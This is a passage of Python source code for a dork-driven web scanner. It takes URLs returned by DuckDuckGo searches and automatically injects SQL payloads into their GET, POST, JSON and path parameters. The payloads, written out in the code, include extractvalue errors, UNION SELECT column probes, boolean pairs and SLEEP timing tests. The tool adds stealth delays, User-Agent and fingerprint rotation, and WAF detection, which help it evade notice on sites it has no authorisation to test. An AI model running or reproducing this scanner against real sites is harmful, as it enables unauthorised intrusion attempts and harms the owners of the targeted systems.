        """Inject error-based payloads and look for DB error signatures in the response body."""
        result = {
            "method":     "error_based",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
            "waf":        None,
        }
        payloads = [
            "1' AND extractvalue(0,concat(0x7e,'TEST',0x7e)) AND '1'='1",
            "1 AND 1=CAST(CONCAT(0x7e,'TEST',0x7e) as INT)",
            "1'; SELECT NULL#",
        ]
        for payload in payloads:
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            test_url = self._inject_payload(url, param_name, payload)
            response = self._get(test_url)
            if response is None:
                continue

            waf = self._detect_waf(response)
            if waf:
                result["waf"] = waf
                result["evidence"].append(f"WAF detected ({waf}): error-based skipped")
                break

            match = self._match_sql_errors(response.text)
            if match:
                db_type, pattern = match
                result["vulnerable"] = True
                result["confidence"] = SQLiConfidence.HIGH.value
                result["evidence"].append(
                    f"{db_type.upper()} error signature matched: {pattern[:60]}"
                )
                return result

            if self.stealth:
                _interruptible_sleep(random.uniform(1.5, 3))

        return result

    def _test_union_based(self, url: str, param_name: str, baseline_len: int) -> Dict:
        """Probe UNION SELECT column counts and look for mismatch errors or abnormal response sizes."""
        result = {
            "method":     "union_based",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
            "waf":        None,
        }

        mismatch_at: List[int] = []

        for n_cols in range(1, _UNION_COLUMNS_MAX + 1):
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            null_cols = ",".join(["NULL"] * n_cols)
            payloads = [
                f"' UNION SELECT {null_cols}--",
                f"' UNION SELECT {null_cols}#",
                f"-1 UNION SELECT {null_cols}--",
                f"0 UNION ALL SELECT {null_cols}--",
            ]

            for payload in payloads:
                if _exit_requested or _skip_current:
                    break

                test_url = self._inject_payload(url, param_name, payload)
                response = self._get(test_url)
                if response is None:
                    continue

                waf = self._detect_waf(response)
                if waf:
                    result["waf"] = waf
                    result["evidence"].append(
                        f"WAF detected ({waf}): UNION probe aborted at {n_cols} cols"
                    )
                    return result

                body = response.text

                if self._UNION_COL_MISMATCH_RE.search(body):
                    if n_cols not in mismatch_at:
                        mismatch_at.append(n_cols)
                        result["evidence"].append(
                            f"UNION col-mismatch at n={n_cols} — server processes UNION"
                        )
                    break

                sql_match = self._match_sql_errors(body)
                if sql_match:
                    db_type, pattern = sql_match
                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.HIGH.value
                    result["evidence"].append(
                        f"UNION triggered {db_type.upper()} error at n={n_cols}: {pattern[:50]}"
                    )
                    return result

                len_diff = abs(len(body) - baseline_len)
                if (response.status_code == 200
                        and len_diff > baseline_len * 0.20
                        and (n_cols in mismatch_at or bool(mismatch_at))):
                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.MEDIUM.value
                    result["evidence"].append(
                        f"UNION SELECT {n_cols} cols: response Δ={len_diff}B "
                        f"(prev mismatches at cols {mismatch_at})"
                    )
                    return result

                if self.stealth:
                    _interruptible_sleep(random.uniform(0.5, 1.5))

        if mismatch_at:
            result["vulnerable"] = True
            result["confidence"] = SQLiConfidence.LOW.value
            result["evidence"].append(
                f"UNION col-mismatch at col(s) {mismatch_at}: UNION syntax processed by server"
            )

        return result

    def _test_boolean_blind(self, url: str, param_name: str, baseline_len: int) -> Dict:
        """Send true/false boolean pairs and detect statistically significant response-size differences."""
        result = {
            "method":     "boolean_blind",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
        }

        bool_payloads = [
            ("1' AND '1'='1", "true"),
            ("1' AND '1'='2", "false"),
            ("1 AND 1=1",     "true"),
            ("1 AND 1=2",     "false"),
        ]

        true_groups:  List[List[int]] = []
        false_groups: List[List[int]] = []

        for payload, payload_type in bool_payloads:
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            test_url = self._inject_payload(url, param_name, payload)
            samples: List[int] = []

            for _ in range(_BOOL_SAMPLES):
                if _exit_requested or _skip_current:
                    break
                r = self._get(test_url)
                if r is not None:
                    samples.append(len(r.text))
                if self.stealth:
                    _interruptible_sleep(random.uniform(0.5, 1))

            if len(samples) >= 2:
                (true_groups if payload_type == "true" else false_groups).append(samples)

            if self.stealth:
                _interruptible_sleep(random.uniform(1, 2))

        if not true_groups or not false_groups:
            return result

        all_true  = [v for g in true_groups  for v in g]
        all_false = [v for g in false_groups for v in g]

        median_true  = statistics.median(all_true)
        median_false = statistics.median(all_false)
        diff         = abs(median_true - median_false)

        internal_variance_true  = max(all_true)  - min(all_true)
        internal_variance_false = max(all_false) - min(all_false)
        noise_ceiling           = baseline_len * 0.04

        if (diff > baseline_len * 0.15
                and internal_variance_true  < noise_ceiling
                and internal_variance_false < noise_ceiling):
            result["vulnerable"] = True
            result["confidence"] = SQLiConfidence.MEDIUM.value
            result["evidence"].append(
                f"Boolean median differential: TRUE={median_true:.0f}B  "
                f"FALSE={median_false:.0f}B  diff={diff:.0f}B  "
                f"variance_t={internal_variance_true:.0f}B  "
                f"variance_f={internal_variance_false:.0f}B"
            )

        return result

    def _test_time_based_blind(self, url: str, param_name: str) -> Dict:
        """Inject SLEEP payloads and detect delays above baseline + margin as time-based blind SQLi."""
        result = {
            "method":     "time_based_blind",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
        }

        baseline = self._measure_baseline_latency(url)
        if baseline is None:
            result["evidence"].append(
                "Skipped: host unreachable or baseline latency too high"
            )
            return result

        threshold  = baseline + _SLEEP_DELAY + _TIMEBASED_MARGIN
        extra_read = _SLEEP_DELAY + _TIMEBASED_MARGIN + 3

        sleep_payloads = [
            f"1' AND SLEEP({_SLEEP_DELAY}) AND '1'='1",
            f"1 AND SLEEP({_SLEEP_DELAY})",
        ]
        neutral_payload = "1' AND '1'='1"

        for sleep_payload in sleep_payloads:
            if self.circuit_breaker.is_dead(url):
                break

            test_url = self._inject_payload(url, param_name, sleep_payload)
            t0       = time.monotonic()
            response = self._get(test_url, extra_read=extra_read)
            elapsed  = time.monotonic() - t0

            sleep_triggered = False
            if response is None and elapsed >= threshold * 0.9:
                sleep_triggered = True
            elif response is not None and elapsed >= threshold:
                sleep_triggered = True

            if not sleep_triggered:
                continue

            if response is not None:
                waf = self._detect_waf(response)
                if waf:
                    result["evidence"].append(
                        f"WAF detected ({waf}): time-based latency may be firewall delay"
                    )
                    continue

            neutral_url      = self._inject_payload(url, param_name, neutral_payload)
            confirm_times:   List[float] = []
            confirm_failures = 0

            for _ in range(_TIMEBASED_CONFIRM):
                if self.circuit_breaker.is_dead(url):
                    break
                if _exit_requested or _skip_current:
                    break
                t_c       = time.monotonic()
                r_c       = self._get(neutral_url)
                elapsed_c = time.monotonic() - t_c

                if r_c is None:
                    confirm_failures += 1
                else:
                    confirm_times.append(elapsed_c)

                _interruptible_sleep(0.5)

            if confirm_failures > 0:
                continue
            if not confirm_times:
                continue

            confirm_avg       = sum(confirm_times) / len(confirm_times)
            confirm_threshold = baseline + _TIMEBASED_MARGIN

            if confirm_avg <= confirm_threshold:
                result["vulnerable"] = True
                result["confidence"] = SQLiConfidence.MEDIUM.value
                result["evidence"].append(
                    f"Time-based confirmed: SLEEP elapsed={elapsed:.1f}s  "
                    f"threshold={threshold:.1f}s  "
                    f"neutral avg={confirm_avg:.2f}s  "
                    f"baseline={baseline:.2f}s"
                )
                return result

        return result

    def test_sqli(self, url: str) -> Dict:
        """Run the full GET-parameter SQLi test suite on url; return a structured result dict."""
        result = {
            "url":                url,
            "vulnerable":         False,
            "overall_confidence": SQLiConfidence.NONE.value,
            "tests":              [],
            "tested":             False,
            "message":            "",
            "waf_detected":       None,
        }

        if not self.has_query_params(url):
            result["message"] = "No query parameters found"
            return result

        if self.circuit_breaker.is_dead(url):
            result["message"] = "Host unreachable (circuit breaker open)"
            return result

        result["tested"] = True
        params = self._extract_query_params(url)
        if not params:
            result["message"] = "No query parameters found"
            return result

        baseline = self._get_baseline_response(url)
        if baseline is None:
            result["message"] = "Could not establish baseline (host unreachable)"
            return result

        baseline_status, baseline_content, baseline_len = baseline

        # Second GET for WAF detection (baseline_content came from text, we need the Response obj)
        _bl2 = self._get(url)
        if _bl2 is not None:
            waf_on_baseline = self._detect_waf(_bl2)
            if waf_on_baseline:
                result["waf_detected"] = waf_on_baseline
                result["message"] = (
                    f"WAF detected ({waf_on_baseline}) on baseline — "
                    f"results may have false negatives"
                )

        per_param_scores: List[int] = []

        for param_name in self._prioritize_params(params):

            if self.circuit_breaker.is_dead(url):
                result["message"] = "Host became unreachable during testing"
                break
            if _exit_requested or _skip_current:
                break
            if not self._probe_parameter(url, param_name, baseline_content):
                continue

            param_score = 0

            error_result = self._test_error_based(url, param_name)
            result["tests"].append(error_result)

            if error_result.get("waf") and not result["waf_detected"]:
                result["waf_detected"] = error_result["waf"]

            if error_result["vulnerable"]:
                if error_result["confidence"] == SQLiConfidence.HIGH.value:
                    param_score += 3
                    result["vulnerable"]         = True
                    result["overall_confidence"] = SQLiConfidence.HIGH.value
                    result["message"]            = f"Tested {len(params)} parameter(s)"
                    return result
                else:
                    param_score += 2

            union_result = self._test_union_based(url, param_name, baseline_len)
            result["tests"].append(union_result)

            if union_result.get("waf") and not result["waf_detected"]:
                result["waf_detected"] = union_result["waf"]

            if union_result["vulnerable"]:
                if union_result["confidence"] == SQLiConfidence.HIGH.value:
                    param_score += 3
                elif union_result["confidence"] == SQLiConfidence.MEDIUM.value:
                    param_score += 2
                else:
                    param_score += 1

            bool_result = self._test_boolean_blind(url, param_name, baseline_len)
            result["tests"].append(bool_result)
            if bool_result["vulnerable"]:
                param_score += 2

            time_result = self._test_time_based_blind(url, param_name)
            result["tests"].append(time_result)
            if time_result.get("vulnerable", False):
                param_score += (
                    3 if time_result["confidence"] == SQLiConfidence.HIGH.value else 2
                )

            if param_score > 0:
                per_param_scores.append(param_score)

            if self.stealth:
                _interruptible_sleep(random.uniform(2, 4))

        if per_param_scores:
            best  = max(per_param_scores)
            avg   = sum(per_param_scores) / len(per_param_scores)

            result["vulnerable"] = True

            if best >= 5:
                result["overall_confidence"] = SQLiConfidence.CRITICAL.value
            elif best >= 3 or avg >= 3:
                result["overall_confidence"] = SQLiConfidence.HIGH.value
            elif best >= 2 or avg >= 2:
                result["overall_confidence"] = SQLiConfidence.MEDIUM.value
            else:
                result["overall_confidence"] = SQLiConfidence.LOW.value

        result["message"] = f"Tested {len(params)} parameter(s)"
        return result

    def test_post_sqli(self, url: str, post_data: Dict[str, str]) -> Dict:
        """Test all POST parameters for SQL injection using error-based detection."""
        result = {
            "url": url, "vulnerable": False,
            "overall_confidence": SQLiConfidence.NONE.value,
            "tests": [], "tested": False, "message": "",
            "waf_detected": None,
        }
        if not post_data or self.circuit_breaker.is_dead(url):
            result["message"] = "No POST parameters or host unreachable"
            return result

        result["tested"]  = True
        baseline_resp     = self._get(url)
        if baseline_resp is None:
            result["message"] = "Could not establish baseline"
            return result

        waf = self._detect_waf(baseline_resp)
        if waf:
            result["waf_detected"] = waf

        confidence_scores = []

        for param_name in post_data.keys():
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            payload_dict             = post_data.copy()
            payload_dict[param_name] = str(post_data[param_name]) + "'"

            _hdrs    = self.fingerprint_rotator.build_headers()
            _data    = payload_dict
            _timeout = self._timeout()

            def _do_post(_d=_data, _h=_hdrs, _t=_timeout):
                """Execute the POST request with the current payload dict inside the worker thread."""
                return self._session.post(
                    url,
                    data    = _d,
                    headers = _h,
                    timeout = _t,
                    verify  = False,
                )

            response = self._run_interruptible(
                _do_post,
                total_timeout    = _CONNECT_TIMEOUT + self.read_timeout,
                on_connect_error = lambda: self.circuit_breaker.mark_dead(url),
            )
            if response is None:
                if self.circuit_breaker.is_dead(url):
                    break
                continue

            waf = self._detect_waf(response)
            if waf:
                if not result["waf_detected"]:
                    result["waf_detected"] = waf
                continue

            match = self._match_sql_errors(response.text)
            if match:
                db_type, pattern = match
                result["vulnerable"] = True
                result["tests"].append({
                    "method":    "post_error_based",
                    "parameter": param_name,
                    "db":        db_type,
                    "evidence":  pattern[:60],
                })
                confidence_scores.append(3)

            if self.stealth:
                _interruptible_sleep(random.uniform(2, 4))

        if confidence_scores:
            avg = sum(confidence_scores) / len(confidence_scores)
            result["overall_confidence"] = (
                SQLiConfidence.HIGH.value if avg >= 3 else SQLiConfidence.MEDIUM.value
            )
            result["vulnerable"] = True

        result["message"] = f"Tested {len(post_data)} POST parameter(s)"
        return result

    def test_json_sqli(self, url: str, json_data: Dict[str, str]) -> Dict:
        """Test all JSON body parameters for SQL injection using error-based detection."""
        result = {
            "url": url, "vulnerable": False,
            "overall_confidence": SQLiConfidence.NONE.value,
            "tests": [], "tested": False, "message": "",
            "waf_detected": None,
        }
        if not json_data or self.circuit_breaker.is_dead(url):
            result["message"] = "No JSON parameters or host unreachable"
            return result

        result["tested"]  = True
        confidence_scores = []

        for key in json_data.keys():
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            payload_dict      = json_data.copy()
            payload_dict[key] = payload_dict[key] + "'"

            _json    = payload_dict
            _timeout = self._timeout()

            def _do_json_post(_j=_json, _t=_timeout):
                """Execute the JSON POST request inside the worker thread."""
                return self._session.post(
                    url,
                    json    = _j,
                    timeout = _t,
                    verify  = False,
                )

            response = self._run_interruptible(
                _do_json_post,
                total_timeout    = _CONNECT_TIMEOUT + self.read_timeout,
                on_connect_error = lambda: self.circuit_breaker.mark_dead(url),
            )
            if response is None:
                continue

            waf = self._detect_waf(response)
            if waf:
                if not result["waf_detected"]:
                    result["waf_detected"] = waf
                continue

            match = self._match_sql_errors(response.text)
            if match:
                db_type, pattern = match
                result["vulnerable"] = True
                result["tests"].append({
                    "method":    "json_error_based",
                    "parameter": key,
                    "db":        db_type,
                    "evidence":  pattern[:60],
                })
                confidence_scores.append(3)

            if self.stealth:
                _interruptible_sleep(random.uniform(2, 4))

        if confidence_scores:
            avg = sum(confidence_scores) / len(confidence_scores)
            result["overall_confidence"] = (
                SQLiConfidence.HIGH.value if avg >= 3 else SQLiConfidence.MEDIUM.value
            )
            result["vulnerable"] = True

        result["message"] = "JSON injection test completed"
        return result

    def test_path_based_sqli(self, url: str) -> Dict:
        """Test path-based SQL injection by appending a quote to numeric/word path segments."""
        result = {
            "method":     "path_based",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
        }
        if self.circuit_breaker.is_dead(url):
            return result

        path = urlparse(url).path
        if re.search(r"/\d+$", path) or re.search(r"/\w+$", path):
            response = self._get(url + "'")
            if response:
                waf = self._detect_waf(response)
                if waf:
                    result["evidence"].append(f"WAF detected ({waf}): path-based skipped")
                    return result

                match = self._match_sql_errors(response.text)
                if match:
                    db_type, pattern = match
                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.HIGH.value
                    result["evidence"].append(
                        f"Path-based SQLi: {db_type.upper()} — {pattern[:60]}"
                    )
        return result


# ══════════════════════════════════════════════════════════════
#  UserAgentRotator
# ══════════════════════════════════════════════════════════════

class UserAgentRotator:
    """Rotates User-Agent strings across Chrome, Firefox, Safari, and Edge profiles."""
    def __init__(self):
        """Flatten all UA strings from USER_AGENTS into a single list; initialise the round-robin index."""
        self.agents        = [a for lst in USER_AGENTS.values() for a in lst]
        self.current_index = 0

    def get_random(self) -> str:
        """Return a random User-Agent string from the pool."""
        return random.choice(self.agents)

    def get_next(self) -> str:
        """Return the next User-Agent string in round-robin order."""
        agent              = self.agents[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.agents)
        return agent


# ══════════════════════════════════════════════════════════════
#  FileAnalyzer
# ══════════════════════════════════════════════════════════════

class FileAnalyzer:
    """
Performs HEAD-request file analysis and optional SQLi checking on discovered URLs.

    Categorises URLs by file extension, respects blacklist/whitelist filters, checks
    HTTP accessibility, and delegates SQLi testing to the embedded SQLiDetector.

"""
    def __init__(self, config: Dict, ua_rotator: UserAgentRotator, fp_rotator: HTTPFingerprintRotator):
        """Initialise with config, UA rotator, fingerprint rotator; build extension map and HTTP session."""
        self.config        = config
        self.ua_rotator    = ua_rotator
        self.fp_rotator    = fp_rotator
        self.extension_map = self._flatten_extensions()
        self.sqli_detector = SQLiDetector(
            stealth = config.get("stealth_mode", False),
            timeout = config.get("request_timeout", 10)
        )
        self.session = self._create_session()

    def _create_session(self) -> requests.Session:
        """Build and return a requests.Session with retry logic for 429/5xx responses."""
        session = requests.Session()
        retry   = Retry(
            total            = self.config.get("max_retries", 3),
            backoff_factor   = 1,
            status_forcelist = [429, 500, 502, 503, 504],
            allowed_methods  = ["GET", "HEAD"]
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount("http://",  adapter)
        session.mount("https://", adapter)
        return session

    def _flatten_extensions(self) -> Dict[str, str]:
        """Build and return a flat {extension: category} dict from the extensions config block."""
        ext_map = {}
        for category, extensions in self.config["extensions"].items():
            for ext in extensions:
                ext_map[ext.lower()] = category
        return ext_map

    def get_file_extension(self, url: str) -> str:
        """Extract and return the lowercased file extension from url, or "" if none."""
        try:
            path = unquote(urlparse(url).path)
            ext  = os.path.splitext(path)[1].lower()
            return ext if ext else ""
        except Exception:
            return ""

    def categorize_url(self, url: str) -> str:
        """Return the category name for url based on its file extension, or "webpage" if unrecognised."""
        ext = self.get_file_extension(url)
        if not ext:
            return "webpage"
        return self.extension_map.get(ext, "other")

    def is_blacklisted(self, url: str) -> bool:
        """Return True if url's extension is in the configured blacklist."""
        if not self.config["blacklist"]:
            return False
        return self.get_file_extension(url) in self.config["blacklist"]

    def is_whitelisted(self, url: str) -> bool:
        """Return True if url's extension passes the whitelist (always True when whitelist is empty)."""
        if not self.config["whitelist"]:
            return True
        return self.get_file_extension(url) in self.config["whitelist"]

    def analyze_file(self, url: str) -> Dict:
        """Perform a HEAD request on url and return a dict with size, content_type, accessible, status_code."""
        result = {
            "url":          url,
            "extension":    self.get_file_extension(url),
            "category":     self.categorize_url(url),
            "size":         None,
            "content_type": None,
            "accessible":   False,
            "status_code":  None,
        }
        try:
            if self.config.get("http_fingerprinting", True):
                self.fp_rotator.get_random()
                headers = self.fp_rotator.build_headers()
            elif self.config.get("user_agent_rotation", True):
                headers = {"User-Agent": self.ua_rotator.get_random()}
            else:
                headers = {"User-Agent": self.ua_rotator.agents[0]}

            response              = self.session.head(
                url,
                timeout         = (4, self.config.get("request_timeout", 10)),
                allow_redirects = True,
                headers         = headers,
                verify          = False,
            )
            result["status_code"] = response.status_code
            result["accessible"]  = response.status_code == 200

            if "content-length" in response.headers:
                try:
                    result["size"] = int(response.headers["content-length"])
                except Exception:
                    pass
            if "content-type" in response.headers:
                result["content_type"] = response.headers["content-type"]

        except Exception as e:
            result["error"] = str(e)
        return result

    def check_sqli(self, url: str) -> Dict:
        """Run SQLi detection on url if sqli_detection is enabled in config; return the result dict."""
        if not self.config.get("sqli_detection", False):
            return {"tested": False}
        return self.sqli_detector.test_sqli(url)


# ══════════════════════════════════════════════════════════════
#  DorkEyeEnhanced
# ══════════════════════════════════════════════════════════════

class DorkEyeEnhanced:
    """
Main orchestrator: runs dork searches, file analysis, SQLi testing, and result persistence.

    Owns the deduplication hash set, statistics counters, and all output-format savers.
    Delegates HTTP work to FileAnalyzer and SQLiDetector.

"""
    def __init__(self, config: Dict, output_file: str = None):
        """Initialise with config and optional output filename; set up rotators, analyzer, and counters."""
        self.config      = config
        self.output_file = output_file
        self.ua_rotator  = UserAgentRotator()
        self.fp_rotator  = HTTPFingerprintRotator()
        self.analyzer    = FileAnalyzer(config, self.ua_rotator, self.fp_rotator)
        self.results:    List[Dict] = []
        self.stats       = defaultdict(int)
        self.url_hashes: Set[str]  = set()
        self.start_time  = time.time()
        self._total_results_at_last_extended_delay: int = 0

    def _hash_url(self, url: str) -> str:
        """Return an MD5 hex digest of url for use as a deduplication key."""
        return hashlib.md5(url.encode(), usedforsecurity=False).hexdigest()

    def is_duplicate(self, url: str) -> bool:
        """Return True if url has already been seen this session; record it if not."""
        h = self._hash_url(url)
        if h in self.url_hashes:
            return True
        self.url_hashes.add(h)
        return False

    def process_dorks(self, dork_input: str) -> List[str]:
        """Return a list of dork strings from a plain string or a .txt file (one dork per line)."""
        if os.path.isfile(dork_input):
            try:
                with open(dork_input, 'r', encoding='utf-8') as f:
                    return [line.strip() for line in f if line.strip() and not line.startswith('#')]
            except Exception as e:
                console.print(f"[red][!] Could not read dork file '{dork_input}': {e}[/red]")
                return []
        return [dork_input]

    def _compute_base_delay(self, results_found: int, stealth: bool) -> float:
        """Compute the inter-dork delay based on result count and whether stealth mode is active."""
        if results_found < 10:
            low, high = 8, 14
        else:
            low, high = 18, 28
        delay = random.uniform(low, high)
        if stealth:
            delay *= random.uniform(1.4, 1.8)
        return round(delay, 2)

    def _should_trigger_extended_delay(self) -> bool:
        """Return True when enough new results have accumulated to trigger an extended rate-limit pause."""
        threshold = self.config.get("extended_delay_every_n_results", 100)
        collected_since_last = len(self.results) - self._total_results_at_last_extended_delay
        return collected_since_last >= threshold

    def search_dork(self, dork: str, count: int,
                    dork_index: int = 1, total_dorks: int = 1) -> List[Dict]:
        """Search DuckDuckGo for one dork via a daemon producer thread; return a list of result dicts.

        Retries up to max_attempts times with exponential backoff. Deduplicates, filters
        blacklist/whitelist, and respects the global interrupt flags throughout.
        """
        global _skip_current, _exit_requested

        _ts = datetime.now().strftime("%H:%M:%S")
        console.print(
            f"\n[bold cyan][ Dork {dork_index}/{total_dorks} ][/bold cyan]"
            f"  [dim]{_ts}[/dim]"
            f"  [dim]Ctrl+C → skip  │  ×2 → quit[/dim]"
        )
        console.print(f"[bold green][*] Searching dork:[/bold green] {_rich_escape(dork)}")

        _skip_current = False

        results       = []
        total_fetched = 0
        max_attempts  = 4  # 1 initial attempt + 3 retries

        _DONE = object()

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console
        ) as progress:
            task = progress.add_task("[cyan]Searching DuckDuckGo...", total=count)

            for attempt in range(max_attempts):
                if _exit_requested or _skip_current:
                    break
                try:
                    batch_size = min(50, count - total_fetched)
                    if batch_size <= 0:
                        break

                    result_queue: queue.Queue = queue.Queue()
                    stop_event = threading.Event()

                    def _producer(dork=dork, batch_size=batch_size,
                                  q=result_queue, stop=stop_event):
                        """Producer thread: iterate DDGS results and push them onto the shared queue; sentinel when done."""
                        try:
                            for item in DDGS().text(dork, max_results=batch_size):
                                if stop.is_set():
                                    break
                                q.put(item)
                        except Exception:
                            pass
                        finally:
                            q.put(_DONE)

                    threading.Thread(target=_producer, daemon=True).start()

                    while True:
                        if _exit_requested or _skip_current:
                            stop_event.set()
                            break
                        try:
                            r = result_queue.get(timeout=0.25)
                        except queue.Empty:
                            continue

                        if r is _DONE:
                            break

                        url = r.get("href") or r.get("url")
                        if not url:
                            continue
                        if self.analyzer.is_blacklisted(url):
                            self.stats["blacklisted"] += 1
                            continue
                        if not self.analyzer.is_whitelisted(url):
                            self.stats["not_whitelisted"] += 1
                            continue
                        if self.is_duplicate(url):
                            self.stats["duplicates"] += 1
                            continue

                        entry = {
                            "url":       url,
                            "title":     r.get("title", ""),
                            "snippet":   r.get("body", ""),
                            "dork":      dork,
                            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            "extension": self.analyzer.get_file_extension(url),
                            "category":  self.analyzer.categorize_url(url)
                        }
                        results.append(entry)
                        total_fetched += 1
                        self.stats["total_found"] += 1
                        self.stats[f"category_{entry['category']}"] += 1
                        progress.update(task, completed=min(total_fetched, count))
                        if total_fetched >= count:
                            stop_event.set()
                            break

                    if total_fetched >= count:
                        break

                    if attempt < max_attempts - 1 and total_fetched < count:
                        if _exit_requested or _skip_current:
                            break
                        backoff = (2 ** attempt) + random.uniform(0, 3)
                        console.print(
                            f"[yellow][~] Retry {attempt + 1}/{max_attempts - 1} — "
                            f"backing off {backoff:.1f}s[/yellow]"
                        )
                        _interruptible_sleep(backoff)

                except Exception as e:
                    console.print(f"[yellow][!] Attempt {attempt + 1} failed: {str(e)}[/yellow]")
                    if attempt < max_attempts - 1 and not _exit_requested and not _skip_current:
                        backoff = (2 ** attempt) + random.uniform(0, 3)
                        console.print(
                            f"[yellow][~] Waiting {backoff:.1f}s before next attempt...[/yellow]"
                        )
                        _interruptible_sleep(backoff)
                    continue

        if _skip_current:
            console.print(f"[yellow][~] Dork {dork_index}/{total_dorks} skipped.[/yellow]")
            _skip_current = False

        console.print(f"[bold blue][+] Found {len(results)} unique results for this dork[/bold blue]")
        return results

    def analyze_results(self, results: List[Dict]) -> List[Dict]:
        """Run file analysis and/or SQLi testing on a batch of result dicts; return the updated list."""
        global _skip_current, _exit_requested

        if not self.config.get("analyze_files", True) and not self.config.get("sqli_detection", False):
            return results
        console.print("\n[bold yellow][*] Analyzing results...[/bold yellow]")
        files_to_analyze  = [r for r in results if r["category"] != "webpage"]
        urls_to_test_sqli = [r for r in results if self.config.get("sqli_detection", False)]

        with Progress(console=console) as progress:
            if self.config.get("analyze_files", True) and files_to_analyze:
                task1 = progress.add_task("[cyan]Analyzing [yellow]files[cyan]...", total=len(files_to_analyze))
                for result in files_to_analyze:
                    if _exit_requested or _skip_current:
                        break
                    analysis = self.analyzer.analyze_file(result["url"])
                    result.update({
                        "file_size":    analysis["size"],
                        "content_type": analysis["content_type"],
                        "accessible":   analysis["accessible"],
                        "status_code":  analysis["status_code"],
                    })
                    progress.advance(task1)
                    _interruptible_sleep(random.uniform(1, 2) if self.config.get("stealth_mode", False) else 0.5)

                if _skip_current and not _exit_requested:
                    console.print("[yellow][~] Ctrl+C — file analysis skipped.[/yellow]")
                    _skip_current = False

            if self.config.get("sqli_detection", False) and urls_to_test_sqli:
                task2 = progress.add_task("[cyan]Testing for [red]SQLi[cyan]...", total=len(urls_to_test_sqli))
                for result in urls_to_test_sqli:
                    if _exit_requested:
                        break
                    if _skip_current:
                        console.print("[yellow][~] Ctrl+C — skipping remaining SQLi tests for this dork.[/yellow]")
                        _skip_current = False
                        break

                    sqli_result         = self.analyzer.check_sqli(result["url"])
                    result["sqli_test"] = sqli_result

                    if sqli_result.get("waf_detected"):
                        console.print(
                            f"[yellow][~] WAF detected "
                            f"({sqli_result['waf_detected']}): {_rich_escape(result['url'])}[/yellow]"
                        )
                        self.stats["waf_detected"] += 1

                    if sqli_result.get("vulnerable", False):
                        self.stats["sqli_vulnerable"] += 1
                        confidence = sqli_result.get("overall_confidence", "?")
                        style = (
                            "[bold magenta]" if confidence == SQLiConfidence.CRITICAL.value
                            else "[bold red]"
                        )
                        console.print(
                            f"{style}[!] Potential SQLi found "
                            f"({confidence}): {_rich_escape(result['url'])}[/{style[1:]}"
                        )
                        # ── Detail: print method + evidence for each positive test ──
                        for _t in sqli_result.get("tests", []):
                            if _t.get("vulnerable"):
                                _method = _t.get("method", "unknown")
                                _ev_list = _t.get("evidence", [])
                                _ev_str = " | ".join(_ev_list[:2]) if _ev_list else ""
                                _param = _t.get("parameter", "")
                                _param_str = f" [param: {_param}]" if _param else ""
                                console.print(
                                    f"[dim]    ↳ method: [yellow]{_method}[/yellow]"
                                    f"{_param_str}"
                                    + (f"  evidence: [italic]{_rich_escape(_ev_str[:120])}[/italic]" if _ev_str else "")
                                    + "[/dim]"
                                )
                    progress.advance(task2)
                    if self.config.get("stealth_mode", False):
                        _interruptible_sleep(random.uniform(3, 6))
        return results

    def run_search(self, dorks: List[str], count: int):
        """
    Iterate over dorks, search each one, analyse results, and apply inter-dork delays.

            Respects the global _skip_current and _exit_requested interrupt flags throughout.
            Saves incrementally after each dork if an output file is configured.

    """
        global _skip_current, _exit_requested

        total_dorks = len(dorks)
        console.print(f"[bold cyan][*] Search with {total_dorks} dork(s)[/bold cyan]\n")
        console.print(
            f"[dim]💡 Ctrl+C during a dork → skip it.  "
            f"Double Ctrl+C → quit.[/dim]\n"
        )
        if self.config.get("stealth_mode", False):
            console.print("[bold magenta][*] Stealth mode: ACTIVE[/bold magenta]")
        if self.config.get("http_fingerprinting", True):
            console.print("[bold magenta][*] HTTP Fingerprinting: ENABLED[/bold magenta]")
        if self.config.get("sqli_detection", False):
            console.print("[bold red][*] SQL Injection Detection: ENABLED[/bold red]")
        if TERMUX_IS_ANDROID:
            console.print("[bold green][*] Android/Termux mode: battery-saver constants active[/bold green]")

        for index, dork in enumerate(dorks, start=1):
            if _exit_requested:
                console.print("[bold red][!!] Exit requested — stopping search.[/bold red]")
                break

            results = self.search_dork(dork, count,
                                       dork_index=index, total_dorks=total_dorks)

            if _exit_requested:
                self.results.extend(results)
                if self.output_file:
                    self.save_results()
                console.print("[bold red][!!] Exit requested — stopping search.[/bold red]")
                break

            if self.config.get("analyze_files", True) or self.config.get("sqli_detection", False):
                results = self.analyze_results(results)

            self.results.extend(results)
            if self.output_file:
                self.save_results()

            if _exit_requested:
                console.print("[bold red][!!] Exit requested — stopping search.[/bold red]")
                break

            if index >= total_dorks:
                break

            stealth = self.config.get("stealth_mode", False)
            delay   = self._compute_base_delay(len(results), stealth)
            console.print(f"[yellow][~] Waiting {delay}s before next dork...[/yellow]")

            _interruptible_sleep(delay)

            if _exit_requested:
                console.print("[bold red][!!] Exit requested — stopping search.[/bold red]")
                break
            if _skip_current:
                console.print("[yellow][~] Delay skipped.[/yellow]")
                _skip_current = False

            if self._should_trigger_extended_delay():
                long_delay = round(
                    random.uniform(120, 150) if stealth
                    else random.uniform(85, 110), 2
                )
                console.print(
                    f"[bold magenta][~] Extended delay: {long_delay}s "
                    f"({len(self.results)} total results collected — rate limit protection)"
                    f"[/bold magenta]"
                )
